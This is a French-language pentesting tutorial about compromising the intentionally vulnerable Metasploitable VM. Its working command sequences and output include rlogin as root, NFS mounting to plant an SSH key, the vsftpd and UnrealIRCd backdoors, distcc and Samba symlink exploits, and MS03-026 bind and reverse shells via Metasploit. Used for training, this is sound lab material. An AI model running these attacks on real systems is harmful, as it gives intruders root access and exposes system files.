# Metasploitable pour test de pénétration

{% embed url="https://sourceforge.net/projects/metasploitable/" %}

Metasploitable est une machine virtuelle sous Linux vulnérable. Cette VM peut être utilisée pour s’entraîner au pentesting \(test de pénétration\), tester des outils de sécurité tels que metasploit et pratiquer les techniques usuelles de pénétration de systèmes.

Nous pouvons télécharger cette machine virtuelle à cette adresse : [https://netix.dl.sourceforge.net/project/metasploitable/Metasploitable2/metasploitable-linux-2.0.0.zip](https://netix.dl.sourceforge.net/project/metasploitable/Metasploitable2/metasploitable-linux-2.0.0.zip) \(825 Mo\)

Le login et mot de passe par défaut sont `msfadmin` et `msfadmin`.

Dès que nous aurons récupéré cette machine, nous devrons extraire le fichier \(fichier zip\) et l’installer dans notre hyperviseur.

Une fois la machine installée et lancée, nous devrions arriver sur l’écran suivant :![images/04EP01.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP01.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Nous pouvons donc nous connecter sur la machine avec l’identifiant `msfadmin` et le mot de passe `msfadmin` et effectuer un `ifconfig` afin de déterminer l’adresse MAC et l’adresse IP.

L’adresse IP est donc pour cette machine 192.168.1.131 et son adresse MAC, 00:0c:29:9a:52:c1.

```text

msfadmin@metasploitable:~$ ifconfig 
  
eth0      Link encap:Ethernet  HWaddr 00:0c:29:9a:52:c1   
          inet addr:192.168.1.131  Bcast:192.168.99.255  
Mask:255.255.255.0 
          inet6 addr: fe80::20c:29ff:fe9a:52c1/64 Scope:Link 
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
```

La première chose que nous ferons si nous le souhaitons est de changer le mot de passe de l’administrateur `msfadmin`.

```text

msfadmin@metasploitable:~$ passwd 
Changement du mot de passe pour fasm.  
Mot de passe UNIX (actuel) : 
```

### 1. Liste des services

De notre machine attaquante, une Kali Linux, nous pouvons essayer d’identifier les services qui tournent sur cette machine avec par exemple l’excellent outil `nmap`. La commande suivante scannera tous les ports TCP sur la machine distante Metasploit :

```text

root@ubuntu:~# nmap -p0-65535 192.168.1.131 
Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-05-31 21:14 PDT 
Nmap scan report for 192.168.99.131 
Host is up (0.00028s latency). 
Not shown: 65506 closed ports 
PORT      STATE SERVICE 
21/tcp    open  ftp 
22/tcp    open  ssh 
23/tcp    open  telnet 
25/tcp    open  smtp 
53/tcp    open  domain 
80/tcp    open  http 
111/tcp   open  rpcbind 
139/tcp   open  netbios-ssn 
445/tcp   open  microsoft-ds 
512/tcp   open  exec 
513/tcp   open  login 
514/tcp   open  shell 
1099/tcp  open  rmiregistry 
1524/tcp  open  ingreslock 
2049/tcp  open  nfs 
2121/tcp  open  ccproxy-ftp 
3306/tcp  open  mysql 
3632/tcp  open  distccd 
5432/tcp  open  postgresql 
5900/tcp  open  vnc 
6000/tcp  open  X11 
6667/tcp  open  irc 
6697/tcp  open  unknown 
8009/tcp  open  ajp13 
8180/tcp  open  unknown 
8787/tcp  open  unknown 
39292/tcp open  unknown 
43729/tcp open  unknown 
44813/tcp open  unknown 
55852/tcp open  unknown 
MAC Address: 00:0C:29:9A:52:C1 (VMware)
```

Chacun de ces points d’entrée est susceptible de comporter une faille quelconque. 

### 2. Services : les bases UNIX

Les ports TCP 512, 513 et 514 sont connus comme des services « `r` » \(Berkeley `r-services` et `r-commands` tels que `rsh`, `rexec` et `rlogin`\), et ont été mal configurés pour autoriser un accès à distance de n’importe quel hôte. Pour pouvoir tirer parti de ces failles, il va nous falloir être sûrs que **rsh-client** est installé et nous pourrons lancer la commande suivante en tant que root sur la machine attaquante. Si une demande nous est faite d’une clé SSH, cela voudra dire que l’utilitaire **rsh-client** n’est pas installé et que le système utilise par défaut SSH.

```text

# rlogin -l root 192.168.1.131 
Last login: Fri Jun  1 00:10:39 EDT 2012 from :0.0 on pts/0 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 
UTC 2008 i686 
root@metasploitable:~# 
```

C’est aussi simple que cela. Le prochain service que nous allons regarder est le **Network File System** \(NFS est un protocole qui permet aux ordinateurs d’accéder à des fichiers via un réseau\). NFS peut être identifié en testant le port 2049 directement ou en demandant la liste des services au portmapper \(processus qui analyse les paquets arrivant sur une interface et qui les route selon leur adresse et leur port de destination\). L’exemple ci-après utilise `rpcinfo` pour identifier NFS et `showmount -e` pour déterminer que le partage "/" \(le root du système de fichiers\) est exporté. Nous aurons besoin des paquets `rpcbind` et `nfs-common` pour suivre cela.

```text

root@ubuntu:~# rpcinfo -p 192.168.1.131 
   program vers proto   port  service 
    100000    2   tcp    111  portmapper 
    100000    2   udp    111  portmapper 
    100024    1   udp  53318  status 
    100024    1   tcp  43729  status 
    100003    2   udp   2049  nfs 
    100003    3   udp   2049  nfs 
    100003    4   udp   2049  nfs 
    100021    1   udp  46696  nlockmgr 
    100021    3   udp  46696  nlockmgr 
    100021    4   udp  46696  nlockmgr 
    100003    2   tcp   2049  nfs 
    100003    3   tcp   2049  nfs 
    100003    4   tcp   2049  nfs 
    100021    1   tcp  55852  nlockmgr 
    100021    3   tcp  55852  nlockmgr 
    100021    4   tcp  55852  nlockmgr 
    100005    1   udp  34887  mountd 
    100005    1   tcp  39292  mountd 
    100005    2   udp  34887  mountd 
    100005    2   tcp  39292  mountd 
    100005    3   udp  34887  mountd 
    100005    3   tcp  39292  mountd 
 
root@ubuntu:~# showmount -e 192.168.1.131 
Export list for 192.168.1.131: 
/ *
```

Obtenir un accès à un système avec un système de fichiers en écriture est une chose triviale. Pour faire cela \(et parce que ssh tourne\), nous allons générer une clé SSH sur notre machine attaquante, monter l’export NFS et ajouter notre clé au compte de l’utilisateur root \(fichier authorized\_keys\) :

```text

root@ubuntu:~# ssh-keygen  
Generating public/private rsa key pair. 
Enter file in which to save the key (/root/.ssh/id_rsa):  
Enter passphrase (empty for no passphrase):  
Enter same passphrase again:  
Your identification has been saved in /root/.ssh/id_rsa. 
Your public key has been saved in /root/.ssh/id_rsa.pub. 
 
root@ubuntu:~# mkdir /tmp/r00t 
root@ubuntu:~# mount -t nfs 192.168.1.131:/ /tmp/r00t/ 
root@ubuntu:~# cat ~/.ssh/id_rsa.pub >> 
/tmp/r00t/root/.ssh/authorized_keys  
root@ubuntu:~# umount /tmp/r00t  
 
root@ubuntu:~# ssh root@192.168.1.131 
Last login: Fri Jun  1 00:29:33 2012 from 192.168.1.128 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 
UTC 2008 i686 
 
root@metasploitable:~# 
```

### 3. Services : Backdoors

Sur le port 21, Metasploitable fait tourner **vsftpd**, le FTP que nous avons configuré au chapitre Machines virtuelles et services. Cette version, ici la version 2.3.4, comporte une backdoor qui a été ajoutée au service par un intrus. La version contenant la backdoor a été mise à disposition sur le web et s’est donc propagée.

La backdoor a été très vite identifiée et enlevée, mais pas assez rapidement puisque beaucoup de personnes ont eu le temps de télécharger la version concernée.

Si un nom qui se termine par « :\) » est envoyé, la backdoor ouvre le port 6200 et lance un shell en écoute sur ce port.

Nous pouvons démontrer cela avec telnet ou utiliser un module de Metasploit pour l’exploiter automatiquement :

```text

root@ubuntu:~# telnet 192.168.1.131 21 
Trying 192.168.1.131... 
Connected to 192.168.1.131. 
Escape character is 'ˆ]'. 
220 (vsFTPd 2.3.4) 
user backdoored:) 
331 Please specify the password. 
pass invalid 
ˆ] 
telnet> quit 
Connection closed. 
 
root@ubuntu:~# telnet 192.168.1.131 6200 
Trying 192.168.1.131... 
Connected to 192.168.1.131. 
Escape character is 'ˆ]'. 
id; 
uid=0(root) gid=0(root)
```

Sur le port 6667 de Metasploitable tourne un démon IRC, UnreaIRCD. Cette version contient une backdoor qui n’a pas été identifiée pendant des mois, déclenchée lorsque les lettres « AB » suivies par une commande système lui sont envoyées sur n’importe quel port en écoute. Metasploit a un module qui l’exploite afin d’obtenir un shell interactif comme montré ci-dessous.

```text
Msfconsole 
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.1.131 
msf  exploit(unreal_ircd_3281_backdoor) > exploit  
[*] Started reverse double handler 
[*] Connected to 192.168.1.131:6667... 
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your 
hostname... 
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your 
hostname; using your IP address instead 
[*] Sending backdoor command... 
[*] Accepted the first client connection... 
[*] Accepted the second client connection... 
[*] Command: echo 8bMUYsfmGvOLHBxe; 
[*] Writing to socket A 
[*] Writing to socket B 
[*] Reading from sockets... 
[*] Reading from socket B 
[*] B: "8bMUYsfmGvOLHBxe\r\n" 
[*] Matching... 
[*] A is input... 
[*] Command shell session 1 opened (192.168.1.128:4444 -> 
192.168.1.131:60257) at 2012-05-31 21:53:59 -0700 
 
id 
uid=0(root) gid=0(root)
```

Une autre et très vieille backdoor, « ingreslock », écoute sur le port 1524. Pour y accéder, rien de plus simple :

```text

root@ubuntu:~# telnet 192.168.1.131 1524 
Trying 192.168.1.131... 
Connected to 192.168.1.131. 
Escape character is 'ˆ]'. 
root@metasploitable:/# id 
uid=0(root) gid=0(root) groups=0(root) 
 
 
Services:Unintentional Backdoors
```

En plus des backdoors vues précédemment, quelques services sont des sortes de backdoors par leur nature. Le premier est **distccd**. Distccd est le serveur du compilateur réparti **distcc**. Il exécute les tâches de compilation qui lui sont confiées en réseau par ses clients.

Distcc peut être exécuté soit sur TCP, soit par une commande de connexion telle que ssh : les connexions TCP sont rapides mais peu sûres ; les connexions SSH sont sécurisées mais plus lentes.

Le problème avec ce service est qu’un attaquant peut aisément le contourner pour lancer une commande de son choix. Nous allons démontrer cela en utilisant un module Metasploit.

```text

Msfconsole 
msf > use exploit/unix/misc/distcc_exec  
msf exploit(distcc_exec) > set RHOST 192.168.1.131 
msf exploit(distcc_exec) > exploit  
 
[*] Started reverse double handler 
[*] Accepted the first client connection... 
[*] Accepted the second client connection... 
[*] Command: echo uk3UdiwLUq0LX3Bi; 
[*] Writing to socket A 
[*] Writing to socket B 
[*] Reading from sockets... 
[*] Reading from socket B 
[*] B: "uk3UdiwLUq0LX3Bi\r\n" 
[*] Matching... 
[*] A is input... 
[*] Command shell session 1 opened (192.168.1.128:4444 -> 
192.168.1.131:38897) at 2012-05-31 22:06:03 -0700 
 
id 
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Samba est une implémentation libre des protocoles SMB \(Server Message Block\) et CIFS \(Common Internet File System\).

Samba fournit des services et fichiers d’impression pour des clients Windows et peut s’intégrer à un domaine Windows Server.

Samba, lorsqu’il est configuré avec un fichier partagé en écriture et avec l’option « wide links » validée \(« on » par défaut\), peut aussi être utilisé comme une backdoor de façon à accéder à des fichiers qui n’ont pas été partagés. L’exemple ci-dessous utilise un module Metasploit pour obtenir un accès au système de fichiers de l’utilisateur root avec une connexion anonyme.

```text

root@ubuntu:~# smbclient -L //192.168.1.131 
Anonymous login successful 
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian] 
        Sharename       Type      Comment 
        ---------       ----      ------- 
        print$          Disk      Printer Drivers 
        tmp             Disk      oh noes! 
        opt             Disk       
        IPC$            IPC       IPC Service (metasploitable 
server (Samba 3.0.20-Debian)) 
        ADMIN$          IPC       IPC Service (metasploitable 
server (Samba 3.0.20-Debian)) 
 
root@ubuntu:~# msfconsole 
msf > use auxiliary/admin/smb/samba_symlink_traversal  
msf  auxiliary(samba_symlink_traversal) > set RHOST 192.168.1.131 
msf  auxiliary(samba_symlink_traversal) > set SMBSHARE tmp 
msf  auxiliary(samba_symlink_traversal) > exploit  
 
[*] Connecting to the server... 
[*] Trying to mount writeable share 'tmp'... 
[*] Trying to link 'rootfs' to the root filesystem... 
[*] Now access the following share to browse the root filesystem: 
[*]     \\192.168.1.131\tmp\rootfs\ 
 
msf  auxiliary(samba_symlink_traversal) > exit 
 
root@ubuntu:~# smbclient //192.168.1.131/tmp 
Anonymous login successful 
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian] 
smb: \> cd rootfs 
smb: \rootfs\> cd etc 
smb: \rootfs\etc\> more passwd 
getting file \rootfs\etc\passwd of size 1624 as 
/tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 
KiloBytes/sec) 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
[..]
```

### 4. Vulnerable Web Services

Des vulnérabilités web sont préinstallées dans Metasploitable. Le serveur web se lance automatiquement quand Metasploitable est démarré. Pour accéder à ces applications web, nous ouvrirons un navigateur web et nous connecterons sur l’URL http://&lt;IP&gt; où &lt;IP&gt; est l’adresse de Metasploitable.

Dans l’exemple, Metasploitable tourne à l’adresse IP 192.168.56.101. Donc nous entrerons http://192.168.56.101/ comme montré dans l’image ci-dessous.![images/04EP02.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP02.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Pour accéder aux applications web particulières, il suffit de cliquer sur les liens de la page d’accueil.

D’autres applications web peuvent être accessibles en indiquant un répertoire dans l’URL : http://&lt;IP&gt;/&lt;Application&gt;/

Par exemple, l’application Mutillidae est accessible à l’adresse : http://192.168.56.101/mutillidae/

Les applications sont installées dans le répertoire /var/www.

Dans cette version, au moment de l’écriture de ce livre, nous avons :

* Mutillidae \(NOWASP Mutillidae 2.1.19\)
* DVWA \(Damn Vulnerable Web Application\)
* phpMyAdmin
* TikiWiki \(TWiki\)
* TikiWiki-old
* dav \(WebDav\)

#### a. Vulnérabilité web : Mutillidae

L’application web Mutillidae \(NOWASP \(Mutillidae\)\) contient toutes les vulnérabilités du classement des 10 failles web de l’OWASP comme le stockage web HTML-5, clickjacking...

Le clickjacking est le moyen de forcer l’internaute à cliquer sur quelque chose sur une page web pour lui faire exécuter une action malveillante.

Inspiré par DVWA, Mutillidae autorise l’utilisateur à changer le « niveau de sécurité » de 0 \(complètement insécurisé\) à 5 \(sécurisé\). En outre, trois niveaux ont été inclus : "Level 0 - très difficile" à "Level 2 - novice".

Si l’application est endommagée par de l’injection ou des hacks, cliquez sur le bouton **Reset DB** qui va remettre tout dans les conditions initiales.![images/04EP03.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP03.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Pour remettre le score des épreuves validées à zéro, il suffira de cliquer sur le bouton **Toggle hints** de la barre de menu.![images/04EP04.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP04.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Vous pourrez trouver toutes les informations nécessaires aux adresses suivantes :

[https://community.rapid7.com/docs/DOC-1875](https://community.rapid7.com/docs/DOC-1875)

[http://www.offensive-security.com/metasploit-unleashed/Metasploitable](http://www.offensive-security.com/metasploit-unleashed/Metasploitable)

#### b. Vulnérabilité web : DVWA

Damn Vulnerable Web App \(DVWA\) est une application web écrite en PHP qui est vulnérable. Son but principal est d’être une aide pour les professionnels de la sécurité pour tester leurs connaissances et leurs outils dans un environnement légal. Elle a aussi pour but d’aider le développeur à comprendre les processus de sécurité de leurs applications et enfin, d’aider les enseignants et étudiants à enseigner ou apprendre les failles Web en classe.

DVWA contient des instructions dans sa page web et des informations additionnelles sont disponibles sur la page wiki de DVWA : [http://code.google.com/p/dvwa/w/list](http://code.google.com/p/dvwa/w/list)

**Default username = admin**

**Default password = password**![images/04EP05.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP05.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

#### c. Vulnérabilité web : Information Disclosure

Une page d’information PHP peut être trouvée à cette adresse : http://&lt;IP&gt;/phpinfo.php. Dans cet exemple, l’URL serait http://192.168.56.101/phpinfo.php.

Nous trouverons donc des informations internes au système et des informations sur les versions des services qui peuvent être utilisées pour la recherche de vulnérabilités. Par exemple, notons que la version de PHP indiquée dans la capture d’écran ci-après est une version 5.2.4, il peut être possible qu’il soit donc vulnérable aux CVE \(Common Vulnerabilities and Exposures\) CVE-2012-1823 et CVE-2012-2311 qui ont affecté les versions de PHP avant 5.3.12 et 5.4.x avant 5.4.2.![images/04EP06.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP06.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Nous avons fait un peu le tour de la VM Metasploitable.

Nous allons revenir ici un peu sur Metasploit afin, pour ceux qui ne le connaissent pas, de le prendre en main, et ceux qui le connaissent, de se remettre en tête son utilisation.

### 5. Metasploit

Nous pourrons l’installer sur notre machine attaquante afin de tester une plate-forme de pentesting.

Metasploit est une plate-forme open source pour développer, tester et utiliser des exploits.

Cette application, à ses débuts, était un jeu en réseau et a évolué en une plate-forme de pentesting, de développement d’exploits et de recherche de failles.

Nous pourrons faire une recherche sur Google afin de trouver le paquet nécessaire sous Linux ou l’exécutable sous Windows.

#### a. Metasploit Command Line Interface \(MSFCLI\)

![images/04EP07.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP07.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Nous utilisons pour l’instant Metasploit 2. Pour découvrir cette application, nous allons utiliser la faille RCP DCOM exploit \(MS03-026\) contre notre victime, un Windows 2000 \(192.168.29.15\).

```text

framework2 # ./msfcli |grep 026  
msrpc_dcom_ms03_026  
Microsoft RPC DCOM MSO3-026  
framework2 #  
```

Nous pouvons maintenant sélectionner l’exploit.

```text

framework2 # ./msfcli msrpc_dcom_ms03_026 O  
Exploit Options  
===============  
Exploit: Name Default Description  
-------- ------ ------- ------------------  
required RHOST  
The target address  
required RPORT 135  
The target port  
Target: Windows NT SP3-6a/2K/XP/2K3 English ALL  
framework2 #
```

Nous pouvons maintenant choisir un PAYLOAD \(P\).

```text

framework2 # ./msfcli msrpc_dcom_ms03_026 RHOST=192.168.9.14 P  
Metasploit Framework Usable Payloads  
====================================  
win32_adduser  
Windows Execute net user /ADD  
win32_bind  
Windows Bind Shell  
win32_bind_dllinject  
Windows Bind DLL Inject  
win32_bind_meterpreter  
Windows Bind Meterpreter DLL Inject  
win32_bind_stg  
Windows Staged Bind Shell  
win32_bind_stg_upexec  
Windows Staged Bind Upload/Execute  
win32_bind_vncinject  
Windows Bind VNC Server DLL Inject  
win32_downloadexec  
Windows Executable Download and Execute  
win32_exec  
Windows Execute Command  
win32_passivex  
Windows PassiveX ActiveX Injection Payload  
win32_passivex_meterpreter Windows PassiveX ActiveX Inject 
Meterpreter  
win32_passivex_stg  
Windows Staged PassiveX Shell  
win32_passivex_vncinject Windows PassiveX ActiveX VNC Server 
Payload  
win32_reverse  
Windows Reverse Shell  
win32_reverse_dllinject Windows Reverse DLL Inject  
win32_reverse_meterpreter Windows Reverse Meterpreter DLL Inject  
win32_reverse_ord  
Windows Staged Reverse Ordinal Shell  
win32_reverse_ord_vncinject Windows Reverse Ordinal VNC Server 
Inject  
win32_reverse_stg  
Windows Staged Reverse Shell  
win32_reverse_stg_upexec Windows Staged Reverse Upload/Execute  
win32_reverse_vncinject Windows Reverse VNC Server Inject  
framework2 # 
```

Nous allons utiliser un bind shell \(win32\_bind\) et choisir la cible \(T\) :

```text

framework2# ./msfcli msrpc_dcom_ms03_026 RHOST=192.168.9.14 
PAYLOAD=win32_bind T  
Supported Exploit Targets  
=========================  
0 Windows NT SP3-6a/2K/XP/2K3 English ALL  
framework2 # 
```

Nous pouvons maintenant lancer l’exploit ainsi créé.

```text

framework2#./msfcli msrpc_dcom_ms03_026 RHOST=192.168.9.14 
PAYLOAD=win32_bind E 
[*] Starting Bind Handler.  
[*] Sending request...  
[*] Got connection from 192.168.9.100:36687 <-> 192.168.9.14:4444
Microsoft Windows XP [Version 5.1.2600]  
(C) Copyright 1985-2001 Microsoft Corp.  
C:\WINDOWS\system32> 
```

Nous obtenons un shell Windows de la machine distante.

#### b. Metasploit Console \(MSFCONSOLE\)

Nous allons refaire la même chose mais avec msfconsole :

```text

framework2 # ./msfconsole  
+ -- --=[ msfconsole v2.7 [157 exploits - 76 payloads]  
msf > help  
Metasploit Framework Main Console Help  
? Show the main console help  
cd Change working directory  
exit Exit the console  
help Show the main console help  
info Display detailed exploit or payload information  
quit  
Exit the console  
reload Reload exploits and payloads  
save Save configuration to disk  
setg Set a global environment variable  
show Show available exploits and payloads  
unsetg Remove a global environment variable  
use  
version  
Select an exploit by name  
Show console version  
msf > show exploits  
msf > use msrpc_dcom_ms03_026  
msf msrpc_dcom_ms03_026 > set RHOST 192.168.9.14  
RHOST -> 192.168.9.14  
msf msrpc_dcom_ms03_026 > set LHOST 192.168.9.100  
LHOST -> 192.168.9.100  
msf msrpc_dcom_ms03_026 > set PAYLOAD win32_reverse  
PAYLOAD -> win32_reverse  
msf msrpc_dcom_ms03_026(win32_reverse) > show TARGETS  
Supported Exploit Targets  
=========================  
0 Windows NT SP3-6a/2K/XP/2K3 English ALL  
msf msrpc_dcom_ms03_026(win32_reverse) > set TARGET 0  
TARGET -> 0  
msf msrpc_dcom_ms03_026(win32_reverse) > exploit  
[*] Starting Reverse Handler.  
[*] Sending request...  
[*] Got connection from 192.168.9.100:4321 <-> 192.168.9.14:1031 
Microsoft Windows XP [Version 5.1.2600]  
(C) Copyright 1985-2001 Microsoft Corp.  
C:\WINDOWS\system32>
```

#### c. Metasploit Web Interface \(MSFWEB\)

MSFWEB lance un serveur sur le port 55555, IP 127.0.0.1.

Si nous nous connectons sur ce port avec un navigateur web, nous obtenons l’interface graphique de Metasploit.

Essayons d’exploiter un vnc\_reverse sur la même machine que précédemment.

```text

framework2 # ./msfweb  
+----=[ Metasploit Framework Web Interface (127.0.0.1:55555)
```

![images/04EP08.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP08.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Cette version peut sembler un peu vieillotte mais peut encore nous aider dans certains cas. Nous retrouvons trois liens : **EXPLOITS**, **PAYLOADS** et **SESSIONS**. 

**SESSIONS** ne nous servira que lorsqu’un exploit aura fonctionné pour accéder à la machine victime.

Nous avons la possibilité de filtrer la recherche par service par exemple \(FTP, HTTP...\) ou par OS \(Operating System\).![images/04EP09.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP09.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Une fois que nous avons sélectionné l’exploit que nous voulons utiliser, une nouvelle fenêtre apparaît qui va nous permettre d’entrer les informations nécessaires, comme l’adresse IP de la victime, le port de la victime, notre adresse IP...

Bien sûr, les informations à fournir diffèrent suivant l’exploit selectionné.![images/04EP10.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP10.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Quand l’exploit est lancé, et s’il réussit, nous avons comme dans l’exemple ci-dessus une information « \[\*\] Shell started on session 1 ».

